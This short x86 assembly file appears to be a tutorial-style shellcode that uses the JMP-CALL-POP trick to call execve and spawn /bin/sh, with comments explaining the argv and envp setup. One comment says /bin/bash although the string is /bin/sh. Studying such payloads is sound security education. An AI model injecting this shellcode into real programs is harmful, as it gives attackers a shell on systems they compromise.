section .text
	global _start
_start:
	jmp short call_shellcode

shellcode:
	pop esi
	xor ebx, ebx				; 0x000000000000
	mov byte [esi + 7], bl		; /bin/bash0x00 -> * pathname
	mov dword [esi + 8], esi	; Address of /bin/bash -> *argv[]
	mov dword [esi + 12], ebx	; 0x00000 -> envp[]

	; execve(const char *pathname,
	;		 char *const argv[],
	;		 char *const envp[]);
	lea ebx, [esi]
	lea ecx, [esi + 8]
	lea edx, [esi + 12]

	xor eax, eax
	mov al, 0xb
	int 0x80

call_shellcode:
	call shellcode
	msg db "/bin/shABBBBCCCC"
